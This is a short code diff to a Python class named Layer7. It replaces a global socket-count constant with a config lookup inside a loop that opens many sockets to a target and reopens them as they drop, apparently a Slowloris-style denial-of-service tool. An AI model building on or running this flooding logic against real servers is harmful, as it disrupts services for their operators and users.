@@ -4,7 +4,7 @@ import requests
 import json
 import random
 import socket
-from src.globals import SOCKET_COUNT
+from src.utils import get_config
 
 
 class Layer7:
@@ -45,7 +45,7 @@ class Layer7:
         list_of_sockets = []
         end_t = timing.time() + time
 
-        for _ in range(SOCKET_COUNT):
+        for _ in range(get_config()["socket_count"]):
             try:
                 s = Layer7.__init_socket(target, port)
             except socket.error as e:
@@ -61,7 +61,7 @@ class Layer7:
                     except socket.error:
                         list_of_sockets.remove(s)
 
-                for _ in range(SOCKET_COUNT - len(list_of_sockets)):
+                for _ in range(get_config()["socket_count"] - len(list_of_sockets)):
                     try:
                         s = Layer7.__init_socket(target, port)
                         if s:
